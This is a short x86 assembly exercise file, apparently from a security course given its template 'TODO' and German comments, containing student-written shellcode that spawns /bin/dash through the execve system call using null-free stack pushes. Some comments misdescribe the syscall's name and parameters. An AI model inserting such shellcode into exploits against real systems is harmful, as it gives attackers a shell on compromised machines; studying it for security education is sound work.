global _start

_start:
    ;----------------------------------
    ; TODO
    ; Your shellcode spawning /bin/dash goes here
	xor eax, eax 	;eax leeren
	push eax 	;0-Byte in den Stack geben
	push 68736164h 	;Dash auf den Stack pushen
	push 2f2f2f2fh 	;4 ''/'' als Padding
	push 6e69622fh 	;''bin'' auf stack pushen
	mov ebx, esp 	;2. Parameter des syscalls (Pointer auf Stack)
	mov al, 0xb	;1. Parameter des syscalls (execv)
	int 0x80	;interrupt: syscall
	
; ------------ End of file ------------ 
